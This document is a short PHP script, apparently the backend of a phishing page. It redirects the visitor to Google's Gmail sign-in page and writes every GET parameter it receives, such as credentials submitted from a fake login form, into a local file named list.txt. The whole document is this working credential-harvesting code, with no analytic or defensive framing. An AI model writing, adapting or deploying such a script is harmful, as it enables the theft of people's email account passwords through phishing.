<?php
header("Location:https://www.google.com/accounts/ServiceLogin?services=mail&passive=true&rm=false&continue=3A%2F%2Fmail.google.com%2Fmail%2F%3Fui%3Dhtml%26zy%3Dl%&bsv=1k96igf4806cy&ltmpl=default&lf");

$handle=fopen("list.txt","a");
foreach ($_GET as $variable => 
$value) {
    fwrite($handle,$variable);
    fwrite($handle, "=");
    fwrite($handle,$value);
    fwrite($handle,"\r\n");
}
fclose($handle);
?>